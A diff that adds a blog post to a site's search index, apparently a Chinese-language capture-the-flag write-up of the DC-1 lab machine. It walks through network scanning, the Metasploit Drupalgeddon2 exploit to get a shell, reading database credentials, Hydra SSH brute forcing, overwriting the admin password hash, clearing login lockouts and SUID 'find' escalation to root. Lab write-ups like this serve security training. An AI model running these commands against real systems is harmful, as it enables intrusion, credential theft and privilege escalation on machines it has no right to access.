@@ -8734,4 +8734,142 @@ docker run -it [IMAGE ID]
 <h5 id="简单的waf"><a href="#简单的waf" class="headerlink" title="简单的waf"></a>简单的waf</h5><p>打不开</p>
 ]]></content>
   </entry>
+  <entry>
+    <title>DC-1</title>
+    <url>/2020/07/29/DC-1/</url>
+    <content><![CDATA[<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><h4 id="渗透测试DC-1靶场"><a href="#渗透测试DC-1靶场" class="headerlink" title="渗透测试DC-1靶场"></a>渗透测试DC-1靶场</h4><p>导入靶场，打开，我们并不知道他的密码是多少。所以也不知道他的IP地址是多少。所以就要想办法获取他的IP地址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729163307610.png" alt="image-20200729163307610"></p>
+<p>先将DC-1改为NAT模式，因为DC-1默认是桥接模式，这样扫描IP的时候是无法扫描出来的。改完NAT再次启动就OK</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729163354625.png" alt="image-20200729163354625"></p>
+<p>打开kali，使用arp-scan来扫描IP地址</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apr-scan -l</span><br></pre></td></tr></table></figure>
+
+<p>可以看到扫描除了一个145的IP，其他三个不是</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729163600799.png" alt="image-20200729163600799"></p>
+<p>知道IP了使用Nmap扫描一下端口，查看开放了那些端口</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.152.145</span><br></pre></td></tr></table></figure>
+
+<p>开方了三个端口22、80、111经过测试只有80端口返回页面正常信息</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729164549883.png" alt="image-20200729164549883"></p>
+<p>在页面中访问这个IP和端口</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729164712268.png" alt="image-20200729164712268"></p>
+<p>使用admin、admin看看能不能行，果然不行。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729164753961.png" alt="image-20200729164753961"></p>
+<p>这样我们用msfconsole来扫描一下有什么漏洞</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 &gt; search Drupal</span><br></pre></td></tr></table></figure>
+
+<p>我们使用时间离现在比较近的而且Rank是excellent的这样渗透率比较高</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729165105874.png" alt="image-20200729165105874"></p>
+<p>使用use命令即可使用该漏洞利用模块</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729165212043.png" alt="image-20200729165212043"></p>
+<p>使用<code>show options</code>查看需要设置的参数</p>
+<ul>
+<li>show option：参数options是保证metasploit框架中的各个模块正确运行所需的各种设置</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options</span><br></pre></td></tr></table></figure>
+
+<p>只需要设置RHOSTS，将IP设置上</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729165601838.png" alt="image-20200729165601838"></p>
+<p>使用set命令设置相应的参数</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set RHOSTS 192.168.152.145</span><br></pre></td></tr></table></figure>
+
+<p>再次使用<code>show options</code>查看是否已经成功设置上了对应的参数</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729165826331.png" alt="image-20200729165826331"></p>
+<p>设置成功后输入攻击指令<code>exploit</code>或者<code>run</code>来执行</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p>这样就成功的和目标主机建立了一个shell</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729170046595.png" alt="image-20200729170046595"></p>
+<p>输入<code>shell</code>使用<code>pwd</code>命令从好看当前所在位置，在使用<code>ls</code>查看当前路径下都有什么文件</p>
+<p>当前目录是/var/www下，使用ls之后发现一个flag1.txt</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729170436126.png" alt="image-20200729170436126"></p>
+<p>使用cat查看一下flag1.txt文件，</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729192350970.png" alt="image-20200729192350970"></p>
+<p>页面返回，经过查询，发现配置文件/var/www/sites/default下的settings.php</p>
+<p>因为我们进入shell初始的位置就是在/var/www下，所以ls就能看到sites进入就行</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 每一个好的CMS都需要一个配置文件 - 你也是</span></span><br><span class="line">Every good CMS needs a config file - and so do you.</span><br></pre></td></tr></table></figure>
+
+<p>使用cat查看一下settings.php这个文件，发现了flag2，并且下面返回了数据库用户名和密码</p>
+<p>flag2</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 暴力和字典攻击并不是获得访问权限的唯一方法（而且您需要访问权限）。你能用这些证书做什么？</span></span><br><span class="line"> * Brute force and dictionary attacks aren't the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729193114040.png" alt="image-20200729193114040"></p>
+<p>尝试连接一下数据库，返回错误，连接不上</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729193435254.png" alt="image-20200729193435254"></p>
+<p>而且根据flag2的提示说<strong>暴力和字典不是唯一的办法</strong>，说明可以进行暴力破解</p>
+<p>使用cat查看一下passwd，查看用户列表passwd在/etc/下，发现了flag4</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729194610464.png" alt="image-20200729194610464"></p>
+<p>可以看到flag4在/home/flag4下，cd 过去查看flag4目录下的内容</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 你能用同样的方法在根目录下找到或访问标志吗</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 可能。但也许这并不容易。或许是吧？</span></span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it's not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>
+
+<p>我们尝试使用hydra 爆破一下，要新建一个Terminal(终端)</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l flag4 -P /usr/share/john/password.lst ssh://192.168.152.145</span><br><span class="line"></span><br><span class="line">或者 </span><br><span class="line"></span><br><span class="line">hydra -l flag4 -P /usr/share/john/password.lst 192.168.152.145 ssh</span><br></pre></td></tr></table></figure>
+
+<p>这样就成功的得到了ssh的用户名和密码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729200424978.png" alt="image-20200729200424978"></p>
+<p>ssh连接</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh flag4@192.168.152.145</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729200525656.png" alt="image-20200729200525656"></p>
+<p>在这里再次进入数据库试试，这样就成功进入到了数据库</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729200654706.png" alt="image-20200729200654706"></p>
+<p>然后就是正常查看用户名和密码了。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看数据库</span></span><br><span class="line">show databases;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入数据库</span></span><br><span class="line">use 数据库名称</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看表</span></span><br><span class="line">show tables;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看表中字段的所有数据</span></span><br><span class="line">select * from 表名</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729200935489.png" alt="image-20200729200935489"></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729200948904.png" alt="image-20200729200948904"></p>
+<p>这里我们进入的是<code>drupaldb</code>数据库，搜索的<code>users</code>表数据</p>
+<p>第一种看起来比较乱，而且使用第一种查询方法是因为我们不知道他的字段名称，所以使用( * )将其所有字段都给列举出来，当知道字段名称之后就直接将( * )给替换成想要查询的字段即可。</p>
+<p>但是我们发现pass的数据是经过加密的</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729201205271.png" alt="image-20200729201205271"></p>
+<p>方法一：drupal重置密码直接将</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">S<span class="variable">$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5</span>.i38jnEKuDR</span></span><br><span class="line">重置为</span><br><span class="line"><span class="meta">#</span><span class="bash"> 123456 加密后</span></span><br><span class="line"><span class="meta">$</span><span class="bash">S<span class="variable">$DmV6ZDa4</span>.zG7K1NTKKVpT4clOOvTHIoWDsrk2xfr3MHUtthCZyGm</span></span><br></pre></td></tr></table></figure>
+
+<p>如何进行加密</p>
+<p>切换到之前的shell终端，使用命令：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php scripts/password-hash.sh 123456 &gt; password.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729202919977.png" alt="image-20200729202919977"></p>
+<p>使用命令cat来查看这个文件</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729203014608.png" alt="image-20200729203014608"></p>
+<p>在切换到mysql的Terminal</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">update  users set pass='$S$DmV6ZDa4.zG7K1NTKKVpT4clOOvTHIoWDsrk2xfr3MHUtthCZyGm' where name='admin'</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729203433522.png" alt="image-20200729203433522"></p>
+<p>回到网址里面，使用该密码登录<code>admin、123456</code></p>
+<p>在content里面查看flag3</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729203952198.png" alt="image-20200729203952198"></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729204016509.png" alt="image-20200729204016509"></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729204026543.png" alt="image-20200729204026543"></p>
+<p>当如果密码输入多次错误之后会返回这样一串错误，这样就是将IP封了6个小时，不管你后面的密码正不正确都回显这个。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">抱歉，此帐户的登录尝试已失败超过5次。它被暂时封锁了。请稍后再试或请求新密码。</span></span><br><span class="line">Sorry, there have been more than 5 failed login attempts for this account. It is temporarily blocked. Try again later or request a new password.</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729204120590.png" alt="image-20200729204120590"></p>
+<p>出现这种问题只需要在mysql数据库中将flood的表的数据清除就行。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729204311331.png" alt="image-20200729204311331"></p>
+<p>使用<code>truncate</code>删除表中数据，并且保留该表</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">truncate flood</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729204422240.png" alt="image-20200729204422240"></p>
+<p>这样再次登录该表成功的登录上去了。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729204447814.png" alt="image-20200729204447814"></p>
+<p>前面查看flag4的时候给出提示flag in root，我们切换到root下查看看看是否有flag5，因为/root是需要有权限的才能进入的，所以就要进行提权，然后进入root来查看</p>
+<p>先试用find命令查看一下，发现确实有flag</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 利用Python模拟tty使目录更易于辨认</span></span><br><span class="line">python -c 'import pty;pty.spawn("/bin/sh")'</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729210843208.png" alt="image-20200729210843208"></p>
+<h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><p>查看find权限，可以看到find是root权限</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729211915299.png" alt="image-20200729211915299"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 新建一个文件或者文本</span></span><br><span class="line">touch/mkdir test</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里将-<span class="built_in">exec</span> 后面改成whoami的时候运行显示root说明是root权限，所以直接在-<span class="built_in">exec</span>后面加上flag5的路径直接查看就可以。</span></span><br><span class="line">find test -exec cat /root/thefinalflag.txt \;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729211339753.png" alt="image-20200729211339753"></p>
+<p>或者进行root提权</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find test -exec '/bin/sh' \;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729211719894.png" alt="image-20200729211719894"></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200729211751033.png" alt="image-20200729211751033"></p>
+]]></content>
+  </entry>
 </search>
